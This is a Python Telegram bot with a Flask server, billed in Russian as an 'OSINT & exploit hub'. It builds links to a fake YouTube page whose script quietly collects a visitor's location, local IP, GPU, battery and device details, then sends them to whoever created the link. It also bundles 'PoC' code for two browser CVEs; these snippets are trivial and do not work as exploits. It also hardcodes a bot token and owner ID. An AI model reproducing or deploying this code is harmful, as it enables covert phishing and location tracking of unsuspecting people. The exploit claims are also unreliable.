import asyncio, threading, os, requests, json, uuid
from flask import Flask, render_template_string, request
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.utils.keyboard import ReplyKeyboardBuilder

API_TOKEN = "8698847126:AAEM6qoKEcFd-oosvzrhz7SqAAewUM_ERhg"
OWNER_ID = 6659724115 
BASE_URL = "https://tg-bot-backend-oo97.onrender.com" 

app = Flask(__name__)
exploit_vault = {} 

PAYLOADS = {
    "CHROME": (
        "🔥 **УЯЗВИМОСТЬ: CVE-2024-7971 (V8 Type Confusion)**\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "📝 **ОПИСАНИЕ:**\n"
        "Ошибка путаницы типов в движке JIT-компиляции V8. Возникает, когда оптимизатор "
        "неверно предполагает тип данных в массиве, позволяя интерпретировать данные "
        "объекта как указатели.\n\n"
        "🎯 **ВЕКТОР АТАКИ:**\n"
        "1. Создается массив с плавающей точкой.\n"
        "2. Вызывается функция-оптимизатор, которая «путает» типы.\n"
        "3. Хакер получает возможность чтения/записи (R/W) произвольных адресов памяти "
        "внутри процесса рендеринга.\n\n"
        "💻 **РАСШИРЕННЫЙ PoC КОД:**\n"
        "```javascript\n"
        "function exploit(arg) {\n"
        "  // Массив оптимизируется под Double\n"
        "  let arr = [1.1, 2.2, 3.3];\n"
        "  // Путаница: записываем объект туда, где ожидалось число\n"
        "  arr[0] = arg;\n"
        "  return arr[0];\n"
        "}\n"
        "// Цикл для принудительного запуска JIT-оптимизации\n"
        "for(let i=0; i<10000; i++) exploit({a: 1});\n"
        "```"
    ),
    "SAFARI": (
        "🔥 **УЯЗВИМОСТЬ: CVE-2023-32409 (WebKit Sandbox Escape)**\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "📝 **ОПИСАНИЕ:**\n"
        "Логическая ошибка в обработке межпроцессного взаимодействия (IPC) в WebKit. "
        "Позволяет контенту внутри вкладки «вырваться» из песочницы браузера.\n\n"
        "🎯 **ВЕКТОР АТАКИ:**\n"
        "Используется специально сформированный iframe или редирект, который вызывает "
        "состояние гонки (race condition) в проверке разрешений родительского процесса.\n\n"
        "💻 **РАСШИРЕННЫЙ PoC КОД:**\n"
        "```javascript\n"
        "// Манипуляция с объектами check-origin\n"
        "let frame = document.createElement('iframe');\n"
        "frame.src = 'about:blank';\n"
        "document.body.appendChild(frame);\n"
        "// Попытка инъекции скрипта в доверенный контекст\n"
        "try { frame.contentWindow.eval('payload_here'); } catch(e) {}\n"
        "```"
    ),
    "OTHER": (
        "⚠️ **УЯЗВИМОСТЬ: Generic Browser Profiling**\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "Конкретных 0-day под данную версию не найдено. Рекомендуется использовать "
        "методы социальной инженерии или искать баги в расширениях браузера.\n"
        "Вектор: **Cross-Site Scripting (XSS)**."
    )
}

HTML_TRAP = """
<!DOCTYPE html>
<html>
<head>
    <title>YouTube</title>
    <meta property="og:title" content="YouTube: Новое видео на канале">
    <meta property="og:description" content="1.2 млн просмотров • 2 часа назад">
    <meta property="og:image" content="https://www.youtube.com/img/desktop/yt_1200.png">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body style="background:#000;color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;" onclick="scan()">
    <div style="text-align:center;border:1px solid #333;padding:50px;cursor:pointer;">
        <div style="width:0;height:0;border-top:20px solid transparent;border-left:30px solid #fff;border-bottom:20px solid transparent;margin:0 auto 20px;"></div>
        <button style="background:#f00;color:#fff;border:none;padding:10px 20px;font-weight:bold;cursor:pointer;">СМОТРЕТЬ</button>
    </div>
<script>
async function scan() {
    let d = { aid: "{{ aid }}", ua: navigator.userAgent, plat: navigator.platform, res: screen.width+"x"+screen.height, cores: navigator.hardwareConcurrency, mem: navigator.deviceMemory };
    
    // Сбор GPU
    try { let c = document.createElement('canvas'); let gl = c.getContext('webgl'); let debug = gl.getExtension('WEBGL_debug_renderer_info'); d.gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL); } catch(e) {}
    // Сбор Батареи
    try { let b = await navigator.getBattery(); d.bat = Math.round(b.level * 100) + "% (" + (b.charging ? "Зарядка" : "Разрядка") + ")"; } catch(e) {}
    // Сбор Local IP
    try { let pc = new RTCPeerConnection(); pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o)); pc.onicecandidate = (i) => { if(i && i.candidate) d.lip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(i.candidate.candidate)[1]; }; } catch(e) {}

    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition((p) => { 
            d.gps = p.coords.latitude+","+p.coords.longitude; d.acc = p.coords.accuracy+"m"; send(d); 
        }, () => { send(d); }, {timeout:3500});
    } else { send(d); }
    setTimeout(() => { send(d); }, 5000);
}

function send(d) {
    if(window.s) return; window.s = true;
    fetch('/catch', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(d) })
    .finally(() => { location.href = "https://youtube.com"; });
}
</script>
</body>
</html>
"""

@app.route('/', strict_slashes=False)
def home(): return "SYSTEM_ONLINE", 200

@app.route('/v/<aid>', strict_slashes=False)
def trap(aid): return render_template_string(HTML_TRAP, aid=aid)

@app.route('/catch', methods=['POST'], strict_slashes=False)
def catch():
    d = request.json
    ips = request.headers.get('X-Forwarded-For', request.remote_addr)
    token = "EXP-" + str(uuid.uuid4())[:6].upper()
    ua = d.get('ua', '')
    p_key = "CHROME" if "Chrome" in ua else "SAFARI" if "Safari" in ua else "OTHER"
    exploit_vault[token] = PAYLOADS.get(p_key)

    report = (
        f"🚨 **ПОЛНЫЙ ТЕХНИЧЕСКИЙ ОТЧЕТ**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🌐 **СЕТЬ:**\n"
        f"• IP: `{ips}`\n"
        f"• Local: `{d.get('lip', 'N/A')}`\n\n"
        f"📍 **ГЕОЛОКАЦИЯ:**\n"
        f"• `{d.get('gps', 'N/A')}` (±{d.get('acc', 'N/A')})\n"
        f"• [Google Maps](https://www.google.com/maps?q={d.get('gps')})\n\n"
        f"💻 **ЖЕЛЕЗО:**\n"
        f"• CPU: {d.get('cores')} ядер | RAM: {d.get('mem')}GB\n"
        f"• GPU: `{d.get('gpu', 'N/A')}`\n"
        f"• Платформа: `{d.get('plat')}` | `{d.get('res')}`\n\n"
        f"🔋 **БАТАРЕЯ:** {d.get('bat', 'N/A')}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🔑 **КРИПТО-КЛЮЧ:** `{token}`\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"⚠️ *Для кода эксплоита перешли ключ админу.*"
    )
    
    url = f"https://api.telegram.org/bot{API_TOKEN}/sendMessage"
    requests.post(url, json={"chat_id": d['aid'], "text": report, "parse_mode": "Markdown", "disable_web_page_preview": True})
    return "OK", 200

bot = Bot(token=API_TOKEN)
dp = Dispatcher()

@dp.message(Command("start"))
async def start(message: types.Message):
    kb = ReplyKeyboardBuilder()
    kb.button(text="🚀 Создать ссылку")
    await message.answer("💀 **OSINT & EXPLOIT HUB v15.1**", reply_markup=kb.as_markup(resize_keyboard=True))

@dp.message(F.text == "🚀 Создать ссылку")
async def create(message: types.Message):
    link = f"{BASE_URL}/v/{message.from_user.id}"
    await message.answer(f"✅ **Ссылка готова:**\n`{link}`")

@dp.message(F.text.startswith("EXP-"))
async def decrypt(message: types.Message):
    if message.from_user.id != OWNER_ID: return
    token = message.text.strip().upper()
    if token in exploit_vault:
        await message.answer(f"🔓 **КОД ЭКСПЛОИТА ({token}):**\n\n```javascript\n{exploit_vault[token]}\n```", parse_mode="Markdown")

async def main():
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=10000), daemon=True).start()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
